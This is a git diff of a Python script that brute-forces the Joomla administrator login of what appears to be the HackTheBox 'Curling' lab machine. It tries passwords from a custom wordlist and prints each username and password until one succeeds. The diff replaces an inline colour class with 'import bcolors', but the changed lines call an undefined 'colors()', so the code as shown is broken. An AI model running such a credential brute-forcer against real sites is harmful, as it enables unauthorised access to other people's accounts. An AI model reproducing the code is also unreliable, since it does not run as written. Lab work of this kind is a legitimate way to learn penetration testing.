@@ -1,15 +1,6 @@
 import requests
 from bs4 import BeautifulSoup
-
-class bcolors:
-    HEADER = '\033[95m'
-    OKBLUE = '\033[94m'
-    OKGREEN = '\033[92m'
-    WARNING = '\033[93m'
-    FAIL = '\033[91m'
-    ENDC = '\033[0m'
-    BOLD = '\033[1m'
-    UNDERLINE = '\033[4m'
+import bcolors
 
 class Joomla():
  
@@ -22,6 +13,7 @@ class Joomla():
         self.ret = 'aW5kZXgucGhw'
         self.option='com_login'
         self.task='login'
+        #Need cookie
         self.cookies = requests.session().get(self.url).cookies.get_dict()
 
         with open('/root/Documents/HackTheBox/curling/customwordlist.txt', 'rb+') as f:
@@ -47,9 +39,9 @@ class Joomla():
             soup = BeautifulSoup(r.text, 'html.parser')
             response = soup.find("div", {"class": "alert-message"})
             if response:
-                print(f"{bcolors.FAIL} {username}:{password}{bcolors.ENDC}")
+                print(f"{colors().FAIL} {username}:{password}{colors().ENDC}")
             else:
-                print(f"{bcolors.OKGREEN} {username}:{password}{bcolors.ENDC}")
+                print(f"{colors().OKGREEN} {username}:{password}{colors().ENDC}")
                 break
 
 joomla = Joomla()
